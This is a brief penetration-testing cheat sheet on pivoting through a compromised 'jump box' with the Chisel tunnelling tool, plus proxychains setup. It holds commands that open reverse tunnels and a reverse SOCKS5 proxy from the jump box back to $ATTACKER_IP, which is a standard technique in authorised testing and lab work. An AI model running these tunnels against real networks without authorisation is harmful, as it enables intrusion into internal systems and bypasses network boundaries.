Using CHISEL:
---

single port on attacker machine

```bash
chisel server --port 8000 --reverse
```

from jump box

```bash
./chisel client $ATTACKER_IP:8000 R:$PORT:$DEST_IP:$PORT
```

 Opening socks5 server on LOCAL machine on port 1080

```bash
chisel server --port 8001 --socks5 --reverse
```

on jump box

```bash
./chisel client --max-retry-count 1 $ATTACKER_IP:8001 R:socks
```

Then edit proxychains config:
  
```config
socks5 127.0.0.1 1080
```

Execute commands with

```bash
proxychains -q
```

in front of them